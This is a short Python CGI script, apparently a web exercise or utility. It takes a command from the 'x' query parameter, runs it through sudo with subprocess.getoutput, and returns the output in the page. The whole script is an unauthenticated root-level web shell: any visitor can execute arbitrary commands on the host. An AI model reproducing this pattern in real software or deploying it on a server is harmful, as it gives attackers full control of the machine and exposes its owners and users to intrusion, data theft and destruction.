#!/usr/bin/python3
print("content-type:text/html")
print()

import cgi
import subprocess

data=cgi.FieldStorage()
cmd=data.getvalue("x")
out=subprocess.getoutput("sudo " +cmd)
print(out)
